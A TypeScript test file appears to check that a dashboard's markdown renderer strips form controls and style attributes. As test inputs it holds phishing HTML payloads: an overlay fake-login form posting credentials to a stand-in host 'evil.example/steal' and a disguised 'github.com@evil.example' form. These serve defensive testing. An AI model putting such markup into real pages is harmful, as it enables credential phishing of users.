/**
 * Pins for the TAG and ATTRIBUTE denylist at the markdown sink.
 *
 * WHAT THIS PINS. `renderMarkdown` calls `purify.sanitize(...)` with
 * `FORBID_TAGS` and `FORBID_ATTR` configuration. This file pins that:
 *
 *   (a) Interactive form controls -- `<form>`, `<button>`, `<select>`,
 *       `<textarea>`, `<option>` -- are stripped via FORBID_TAGS; `<input>`
 *       is stripped via a `uponSanitizeElement` hook UNLESS it is
 *       `type="checkbox" disabled` (GFM task-list checkbox). These are the
 *       tags named in GitHub issue #195 / C89. A form wrapping an
 *       attacker-chosen button label, rendered on a trusted origin, is a
 *       phishing vector even when the `action` URL is policed by `safeHref`.
 *
 *   (b) The `style` attribute is stripped. Attacker-controlled CSS can
 *       position an overlay over real UI (the overlay vector from the C89
 *       ruling: "conform to a similar set of expectations as on github").
 *
 * EVERY REFUSAL ARM CARRIES A POSITIVE CONTROL showing the instrument was
 * alive -- a neighbouring construct in the same output that DID survive.
 *
 * WHY A SEPARATE FILE. `markdown-href.test.ts` pins the URL policy;
 * `render-sink-xss.test.ts` pins XSS neutralisation. This pins the tag and
 * attribute scope, which is a different claim from both. The three together
 * cover: what SCHEMES are refused (href), what CONSTRUCTS are refused (XSS),
 * and what ELEMENTS and ATTRIBUTES are refused (this file).
 */
import { JSDOM } from 'jsdom';
import { assert, assertEqual } from './assertions.js';

// ---------------------------------------------------------------------------
// jsdom globals, same pattern as markdown-href.test.ts.
// ---------------------------------------------------------------------------
const dom = new JSDOM('<!doctype html><html><body></body></html>', {
  url: 'https://dashboard.test/',
});
const g = globalThis as unknown as Record<string, unknown>;
const w = dom.window as unknown as Record<string, unknown>;
for (const key of Object.getOwnPropertyNames(dom.window)) {
  if (key in globalThis) continue;
  try { g[key] = w[key]; } catch {}
}
g.window = dom.window;
g.document = dom.window.document;

const { renderMarkdown } = await import('./markdown.js');

/** Parse sanitised HTML for DOM inspection. */
function parse(html: string): Document {
  return new JSDOM(`<body>${html}</body>`, { url: 'https://dashboard.test/' }).window.document;
}

// ---------------------------------------------------------------------------
// (a) FORM CONTROLS ARE STRIPPED.
// ---------------------------------------------------------------------------

/**
 * C89 / issue #195: form controls must not survive the markdown sink.
 *
 * MEASURED BEFORE THE FIX (pre-change verbatim survivors):
 *
 *   INPUT:  <form action="https://github.com@evil.example/"><button>View pull request #482</button></form>
 *   OUTPUT: <form><button>View pull request #482</button></form>
 *   The `action` attribute was stripped by the afterSanitizeAttributes hook,
 *   but <form> and <button> survived as interactive elements.
 *
 *   INPUT:  <input type="text" placeholder="Enter password">
 *   OUTPUT: <input type="text" placeholder="Enter password">
 *   The <input> survived intact.
 *
 *   INPUT:  <select><option value="a">A</option><option value="b">B</option></select>
 *   OUTPUT: <p><select><option value="a">A</option><option value="b">B</option></select></p>
 *   Both <select> and <option> survived.
 *
 *   INPUT:  <textarea>Enter credentials</textarea>
 *   OUTPUT: <textarea>Enter credentials</textarea>
 *   The <textarea> survived intact.
 *
 * MEASURED AFTER THE FIX: five tags are stripped by FORBID_TAGS (form,
 * button, select, textarea, option); `<input>` is stripped by a
 * `uponSanitizeElement` hook that refuses all inputs except
 * `<input type="checkbox" disabled>` (GFM task-list checkboxes).
 * Text content of stripped tags is preserved by DOMPurify (it removes the
 * tags, not their children), so the text "View pull request #482" remains
 * visible as inline text -- the interactive control is gone, the label stays.
 */
function testFormControlsAreStripped(): void {
  const cases: ReadonlyArray<readonly [string, string, string]> = [
    ['form with button', '<form action="https://example.com/search"><button>Go</button></form>', 'form'],
    ['bare input', '<input type="text" placeholder="Enter password">', 'input'],
    ['bare button', '<button>Click me</button>', 'button'],
    ['select with options', '<select><option value="a">A</option></select>', 'select'],
    ['textarea', '<textarea>Type here</textarea>', 'textarea'],
    ['bare option', '<option value="x">X</option>', 'option'],
  ];

  for (const [name, payload, tag] of cases) {
    const html = renderMarkdown(payload);
    const doc = parse(html);
    const found = doc.querySelector(tag);
    assertEqual(
      found,
      null,
      `${name}: <${tag}> survived the markdown sink -- must be stripped ` +
        `(FORBID_TAGS or uponSanitizeElement hook). Output: ${html}`,
    );
  }
}

/**
 * POSITIVE CONTROL for form stripping: ordinary block-level and inline
 * elements that are NOT in FORBID_TAGS must still survive. Without this,
 * a sanitiser that strips everything would satisfy testFormControlsAreStripped.
 */
function testOrdinaryElementsSurviveFormStripping(): void {
  const html = renderMarkdown(
    '<div><p>Paragraph with <strong>bold</strong> and <em>italic</em></p></div>',
  );
  const doc = parse(html);
  assert(doc.querySelector('div') !== null, '<div> must survive');
  assert(doc.querySelector('p') !== null, '<p> must survive');
  assert(doc.querySelector('strong') !== null, '<strong> must survive');
  assert(doc.querySelector('em') !== null, '<em> must survive');
}

/**
 * The phishing vector from issue #195, verbatim. A form wrapping a button
 * with an attacker-chosen label, on a trusted origin, must not render as an
 * interactive control.
 *
 * The text "View pull request #482" SHOULD survive (as inline text), because
 * DOMPurify preserves text content of stripped tags. The <form> and <button>
 * elements must not.
 */
function testPhishingFormVectorIsNeutralised(): void {
  const payload =
    '<form action="https://github.com@evil.example/">' +
    '<button>View pull request #482</button></form>';
  const html = renderMarkdown(payload);
  const doc = parse(html);
  assertEqual(doc.querySelector('form'), null, 'the phishing <form> survived');
  assertEqual(doc.querySelector('button'), null, 'the phishing <button> survived');
  // The label text should still be visible (DOMPurify keeps text of stripped tags)
  assert(
    html.includes('View pull request #482'),
    `the label text was lost along with the form: ${html}`,
  );
}

/**
 * A form whose action is an ordinary, same-origin URL is STILL stripped.
 * The ruling is about the ELEMENT, not about the URL. A form with
 * action="/search" is a legitimate-looking control that submits to our
 * origin, but rendering attacker-authored interactive controls on a trusted
 * page is the threat model, regardless of destination.
 */
function testFormIsStrippedEvenWithSafeAction(): void {
  const html = renderMarkdown(
    '<form action="/search"><button>Search</button></form>',
  );
  const doc = parse(html);
  assertEqual(
    doc.querySelector('form'),
    null,
    'a form with a same-origin action survived -- the ruling strips the element, not the URL',
  );
}

// ---------------------------------------------------------------------------
// (a′) GFM TASK-LIST CHECKBOXES SURVIVE.
// ---------------------------------------------------------------------------

/**
 * GFM task lists (`- [ ]`, `- [x]`) render via `marked` as `<li>` elements
 * containing `<input type="checkbox" disabled>`. These are read-only display
 * elements, not interactive form controls. They must survive the sanitiser.
 *
 * GitHub renders task-list checkboxes (the owner ruling says to conform to
 * GitHub's expectations). A sanitiser that strips them is ANTI-conforming.
 *
 * MEASURED, BEFORE THE FIX (round-2 regression on round-1 code):
 *   marked.parse('- [x] Done\n- [ ] Pending') produces:
 *     <ul>
 *     <li><input checked="" disabled="" type="checkbox"> Done</li>
 *     <li><input disabled="" type="checkbox"> Pending</li>
 *     </ul>
 *   With `input` in FORBID_TAGS, the output was:
 *     <ul><li> Done</li><li> Pending</li></ul>
 *   Checkboxes silently disappeared. No visual distinction between checked
 *   and unchecked items.
 *
 * MEASURED, AFTER THE FIX (input removed from FORBID_TAGS, hook added):
 *   The checkboxes survive with type, disabled, and checked attributes intact.
 */
function testTaskListCheckboxesSurvive(): void {
  const md = '- [x] Done item\n- [ ] Pending item';
  const html = renderMarkdown(md);
  const doc = parse(html);

  const checkboxes = Array.from(doc.querySelectorAll('input[type="checkbox"]'));
  assertEqual(
    checkboxes.length,
    2,
    `Expected 2 task-list checkboxes, found ${checkboxes.length}. Output: ${html}`,
  );

  // Both must have disabled (read-only)
  for (const cb of checkboxes) {
    assertEqual(
      cb.hasAttribute('disabled'),
      true,
      `Task-list checkbox missing disabled attribute. Output: ${html}`,
    );
  }

  // First checkbox (checked item) must have checked
  assertEqual(
    checkboxes[0]!.hasAttribute('checked'),
    true,
    `Checked task-list item missing checked attribute. Output: ${html}`,
  );

  // Second checkbox (unchecked item) must NOT have checked
  assertEqual(
    checkboxes[1]!.hasAttribute('checked'),
    false,
    `Unchecked task-list item has checked attribute. Output: ${html}`,
  );

  // The surrounding <li> and <ul> must survive (positive control)
  assert(doc.querySelector('ul') !== null, '<ul> must survive');
  assert(doc.querySelectorAll('li').length === 2, 'both <li> elements must survive');
}

/**
 * Interactive inputs are STILL stripped, even though task-list checkboxes
 * survive. The hook strips <input> unless type="checkbox" AND disabled.
 */
function testInteractiveInputsStillStripped(): void {
  const cases: ReadonlyArray<readonly [string, string]> = [
    ['text input', '<input type="text" placeholder="Enter password">'],
    ['password input', '<input type="password">'],
    ['submit input', '<input type="submit" value="Go">'],
    ['hidden input', '<input type="hidden" name="x" value="y">'],
    ['bare input (no type)', '<input>'],
    ['checkbox WITHOUT disabled', '<input type="checkbox">'],
    ['checkbox with only checked (no disabled)', '<input type="checkbox" checked>'],
  ];

  for (const [name, payload] of cases) {
    const html = renderMarkdown(payload);
    const doc = parse(html);
    assertEqual(
      doc.querySelector('input'),
      null,
      `${name}: <input> survived -- the uponSanitizeElement hook must strip it. Output: ${html}`,
    );
  }

  // POSITIVE CONTROL: a task-list checkbox (type=checkbox + disabled) survives
  const positiveHtml = renderMarkdown('- [x] Checked');
  const positiveDoc = parse(positiveHtml);
  assert(
    positiveDoc.querySelector('input[type="checkbox"]') !== null,
    'positive control: task-list checkbox must survive while interactive inputs are stripped',
  );
}

// ---------------------------------------------------------------------------
// (b) STYLE ATTRIBUTE IS STRIPPED.
// ---------------------------------------------------------------------------

/**
 * The overlay vector: attacker-controlled CSS positioned over real UI.
 *
 * MEASURED BEFORE THE FIX (pre-change verbatim survivor):
 *
 *   INPUT:  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">FAKE LOGIN</div>
 *   OUTPUT: <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">FAKE LOGIN</div>
 *   The style attribute survived verbatim.
 *
 * MEASURED AFTER THE FIX: the style attribute is stripped by FORBID_ATTR.
 * The <div> element and its text content survive; only the attribute is gone.
 */
function testStyleAttributeIsStripped(): void {
  const payload =
    '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">overlay</div>';
  const html = renderMarkdown(payload);
  const doc = parse(html);
  const div = doc.querySelector('div');
  assert(div !== null, '<div> must survive (only the style attribute should be stripped)');
  assertEqual(
    div!.hasAttribute('style'),
    false,
    `the style attribute survived the markdown sink. Output: ${html}`,
  );
}

/**
 * POSITIVE CONTROL for style stripping: the class attribute, which is NOT
 * in FORBID_ATTR, must survive on the same element. This proves the
 * instrument distinguishes attributes rather than stripping all of them.
 */
function testClassAttributeSurvivesWhenStyleIsStripped(): void {
  const html = renderMarkdown('<div class="info-box" style="color:red">text</div>');
  const doc = parse(html);
  const div = doc.querySelector('div');
  assert(div !== null, '<div> must survive');
  assertEqual(
    div!.hasAttribute('class'),
    true,
    'the class attribute was stripped along with style -- FORBID_ATTR is too broad',
  );
  assertEqual(
    div!.hasAttribute('style'),
    false,
    'the style attribute survived despite FORBID_ATTR',
  );
}

/**
 * Style on various elements, not just div. The FORBID_ATTR applies globally.
 */
function testStyleIsStrippedOnAllElements(): void {
  const cases: ReadonlyArray<readonly [string, string, string]> = [
    ['span', '<span style="color:transparent">hidden</span>', 'span'],
    ['p', '<p style="display:none">invisible</p>', 'p'],
    ['table', '<table style="position:absolute"><tr><td>x</td></tr></table>', 'table'],
  ];
  for (const [name, payload, tag] of cases) {
    const html = renderMarkdown(payload);
    const el = parse(html).querySelector(tag);
    assert(el !== null, `<${tag}> must survive`);
    assertEqual(
      el!.hasAttribute('style'),
      false,
      `${name}: the style attribute survived on <${tag}>. Output: ${html}`,
    );
  }
}

// ---------------------------------------------------------------------------
// COMBINED VECTOR: form controls + style overlay.
// ---------------------------------------------------------------------------

/**
 * The full attack: a CSS overlay presenting a fake login form with interactive
 * controls. Both the style attribute and the form elements must be stripped.
 */
function testCombinedOverlayPhishingIsNeutralised(): void {
  const payload =
    '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999">' +
    '<form action="https://evil.example/steal">' +
    '<p>Your session has expired. Please log in again.</p>' +
    '<input type="text" placeholder="Username">' +
    '<input type="password" placeholder="Password">' +
    '<button>Log In</button>' +
    '</form></div>';
  const html = renderMarkdown(payload);
  const doc = parse(html);

  // Style must be gone
  const div = doc.querySelector('div');
  assert(div !== null, '<div> must survive');
  assertEqual(div!.hasAttribute('style'), false, 'the overlay style survived');

  // Form controls must be gone
  assertEqual(doc.querySelector('form'), null, '<form> survived');
  assertEqual(doc.querySelector('input'), null, '<input> survived');
  assertEqual(doc.querySelector('button'), null, '<button> survived');

  // The text content should remain visible
  assert(html.includes('Your session has expired'), 'the text content was lost');
}

// ---------------------------------------------------------------------------
// MEASURED NEGATIVE: formaction is already stripped by DOMPurify defaults.
// ---------------------------------------------------------------------------

/**
 * MEASURED NEGATIVE, confirming the existing documentation in markdown.ts:
 * `formaction` on `<button>` is stripped by DOMPurify's own defaults before
 * any hook runs. This is recorded as a negative, not pinned as a guard.
 *
 * NOTE: with FORBID_TAGS now stripping <button>, this becomes doubly
 * unreachable. The tag itself is gone, so the attribute question is moot.
 * Recorded here for completeness of the measurement, matching the convention
 * in markdown.ts's LINK_ATTRS docblock.
 */
function testFormactionIsAlreadyStrippedByDOMPurifyDefaults(): void {
  // Before FORBID_TAGS, DOMPurify stripped formaction but kept <button>.
  // After FORBID_TAGS, <button> itself is gone. Either way, formaction does
  // not survive. We check no element in the output carries formaction.
  const html = renderMarkdown('<button formaction="https://evil.example/">Click</button>');
  const doc = parse(html);
  for (const el of Array.from(doc.querySelectorAll('*'))) {
    assertEqual(
      el.hasAttribute('formaction'),
      false,
      `formaction survived on <${el.tagName.toLowerCase()}>`,
    );
  }
}

// ---------------------------------------------------------------------------
// Runner.
// ---------------------------------------------------------------------------

async function run(): Promise<void> {
  testFormControlsAreStripped();
  testOrdinaryElementsSurviveFormStripping();
  testPhishingFormVectorIsNeutralised();
  testFormIsStrippedEvenWithSafeAction();
  testTaskListCheckboxesSurvive();
  testInteractiveInputsStillStripped();
  testStyleAttributeIsStripped();
  testClassAttributeSurvivesWhenStyleIsStripped();
  testStyleIsStrippedOnAllElements();
  testCombinedOverlayPhishingIsNeutralised();
  testFormactionIsAlreadyStrippedByDOMPurifyDefaults();
  console.log('markdown-sanitize: ok');
}

await run();
